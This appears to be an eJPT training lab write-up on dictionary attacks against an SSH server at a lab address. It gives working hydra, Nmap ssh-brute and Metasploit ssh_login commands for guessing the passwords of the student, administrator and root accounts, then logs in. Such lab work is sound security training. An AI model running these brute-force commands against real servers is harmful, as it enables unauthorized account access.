In this challenge, we will look at the dictionary attacks on SSH server. Please start the lab and answer the following questions:

**Questions:**

**1. Find the password of user “student” using hydra.**
   
   gzip -d /usr/share/wordlists/rockyou.txt.gz   
   hydra -l student -P /usr/share/wordlists/rockyou.txt 192.87.3.3 ssh

![image](https://github.com/ALBKIN/eJPT-notes/assets/127192635/2ce3f59b-1b00-4301-98a8-49447494b56b)

 
**2. Find the password of user “administrator” use appropriate Nmap scripts with password dictionary: /usr/share/nmap/nselib/data/passwords.lst**

   echo "administrator" > users   
   nmap -p22 --script ssh-brute --script-args userdb=/root/users 192.87.3.3

 ![image](https://github.com/ALBKIN/eJPT-notes/assets/127192635/2eb97137-3177-47ab-a74e-98d7eb5ad26b)


**3. Find the password of user “root” using ssh_login Metasploit module with userpass dictionary: /usr/share/wordlists/metasploit/root_userpass.txt**

   msfconsole
   use auxiliary/scanner/ssh/ssh_login

   options</br>
   set USERNAME root</br>
   set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt</br>
   set VERBOSE true</br>
   set STOP_ON_SUCCESS true</br>
   setg RHOSTS 192.87.3.3</br>
   exploit</br>
   
  ![image](https://github.com/ALBKIN/eJPT-notes/assets/127192635/c3521c9f-c4f9-4199-b5fb-c844ba4302f8)   
   

**4. What is the message of the day? (Printed after the user logs in to the SSH server).**

   ssh root@192.87.3.3 

![image](https://github.com/ALBKIN/eJPT-notes/assets/127192635/83134eda-8bcc-4fbe-a92b-0bdb01b0c7ff)


